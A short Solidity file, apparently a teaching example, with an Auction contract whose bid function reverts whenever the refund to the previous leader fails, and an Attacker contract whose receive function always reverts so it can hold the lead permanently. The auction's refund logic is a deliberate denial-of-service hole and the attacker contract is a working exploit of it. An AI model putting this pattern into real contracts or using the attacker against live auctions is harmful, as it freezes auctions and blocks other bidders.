// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

contract Auction {
    address public currentLeader;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid);
        require(payable(currentLeader).send(highestBid));
        // Refund the old leader, if it fails then revert
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Attacker {
    Auction public target;

    constructor(address _target) {
        target = Auction(_target);
    }

    function bid() public payable {
        target.bid{value: msg.value}();
    }

    receive() external payable {
        revert();
    }
}
